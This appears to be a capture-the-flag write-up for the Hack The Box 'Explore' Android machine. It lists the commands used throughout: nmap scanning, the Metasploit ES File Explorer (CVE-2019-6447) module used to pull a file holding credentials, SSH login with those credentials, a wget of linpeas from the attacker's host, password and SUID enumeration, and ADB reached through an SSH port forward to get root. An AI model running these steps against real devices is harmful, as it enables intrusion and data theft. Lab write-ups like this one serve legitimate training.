# Explore - Easy

```sh
sudo vim /etc/hosts
# add explore.htb

nmap -T4 -p- -A -Pn -v explore.htb
```

* open ports & services:

    * 2222/tcp - ssh
    * 5555/tcp - filtered - freeciv
    * 43231/tcp - unknown
    * 59777/tcp - http - Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older

* ```nmap``` identifies the SSH service with the fingerprint 'SSH-2.0-SSH Server - Banana Studio' - this is a for a SSH server app running on Android devices

* Googling for port 59777 and associated services shows that it is used by the Android app ES File Explorer

* Google results also show [CVE-2019-6447](https://www.exploit-db.com/docs/english/49948-es-file-explorer-file-manager-4.1.9.7.4---paper.pdf) - a vuln in ES File Explorer, which opens the port 59777 and an attacker can connect to it

* we can attempt running the exploit in Metasploit:

    ```sh
    msfconsole -q

    search cve-2019-6447

    use auxiliary/scanner/http/es_file_explorer_open_port

    info
    # it supports multiple actions

    options

    set RHOSTS explore.htb
    # port is already set to 59777

    run
    # exploit did not work
    ```

* the exploit did not work initially, and navigating to 'http://explore.htb:59777' was giving a 500 error - "SERVER INTERNAL ERROR: Serve() returned a null response.", so I reset the machine

* after resetting the machine, the page was giving the error - "FORBIDDEN: No directory listing", and attempting the exploit again worked:

    ```sh
    run
    # exploit worked
    # device name - 'VMWare Virtual Platform'
    ```

* as the exploit works, we can attempt all available actions to check for more info:

    * list apps using ```set action LISTAPPS``` and run the exploit - this lists the apps with version info, and we can see that it is not having many apps

    * list audios using ```set action LISTAUDIOS``` and run - this does not show any audio files

    * list files using ```set action LISTFILES``` and run - this shows a lot of files & folders on the phone sdcard, but nothing stands out

    * list pictures using ```set action LISTPICS``` and run - this gives 4 image files & their paths; one of them is titled 'creds.jpg', so we can check this file

    * fetch the image file by setting the path:

        ```sh
        set action GETFILE

        set actionitem /storage/emulated/0/DCIM/creds.jpg

        run
        # this fetches the file and gives the local path
        ```
    
    * we can open the downloaded 'creds.jpg' file locally now

* from the image file, we get the handwritten creds 'kristi:Kr1sT!5h@Rp3xPl0r3!'

* we can attempt to login via SSH:

    ```sh
    ssh kristi@explore.htb -p 2222
    # this gives an error
    ```

* connecting to SSH port 2222 gives us the error "Unable to negotiate" and "no matching host key type found. Their offer: ssh-rsa"

* Googling for this error message shows that we need to explicitly mention the option to include 'ssh-rsa' algorithm - we can try connecting again:

    ```sh
    ssh -oHostKeyAlgorithms=+ssh-rsa kristi@explore.htb -p 2222
    # this works

    pwd
    # we are in '/' directory

    ls -la
    # enumerate the files

    ls -la /sdcard
    # links to another directory

    ls -la /storage/self/primary
    # this links to another dir

    ls -la /storage/emulated/0
    # user directory

    cd /storage/emulated/0

    cat user.txt
    # user flag

    ls -laR
    # enum user dir, recursively
    # this does not give anything

    # fetch linpeas from attacker - for basic enum
    
    which wget
    # exists on phone

    wget http://10.10.14.27:8000/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    # this fails
    ```

* we are unable to run ```linpeas``` on the Android system as we cannot assign it executable rights

* so we need to proceed with manual enumeration:

    ```sh
    whoami
    # u0_a76

    sudo -l
    # sudo not found

    uname -r
    # 4.9.214-android-x86_64-g04f9324

    find / -perm -222 -type d 2>/dev/null
    # search world-writable folders

    find / -type f -iname ".*" -ls 2>/dev/null
    # search all hidden files

    grep --color=auto -rnwiIe "PASSW\|PASSWD\|PASSWORD\|PWD" / 2>/dev/null
    # search password strings

    find / -perm -u=s -type f 2>/dev/null
    # search SUID binaries

    ss -ltnp
    # shows ports listening
    ```

* from ```ss -ltnp```, we can see additional ports mentioned - and this includes port 5555, which was shown as 'filtered' earlier by ```nmap```

* Googling for port 5555 and associated services shows that ADB (Android Debug Bridge) runs on this port - we can use [this blog](https://www.verylazytech.com/android-debug-bridge-adb-port-5555) for reference

* we cannot interact with the ```adb``` service on the Android shell as it does not have ```adb``` or ```nc``` installed, so we can locally forward port 5555 instead, and interact with it from attacker:

    ```sh
    # on attacker
    sudo apt install adb

    # local port forwarding
    ssh -oHostKeyAlgorithms=+ssh-rsa -L 1234:localhost:5555 kristi@explore.htb -p 2222
    # such that we can access the 'adb' service on attacker port 1234

    # now we can attempt using adb to connect
    adb connect localhost:1234
    # this works

    adb devices -l
    # this lists the phone

    adb root || true
    # try to check if we can escalate to 'root' directly

    adb shell
    # this works, we have root shell now

    id
    # root

    cat /data/root.txt
    # root flag
    ```
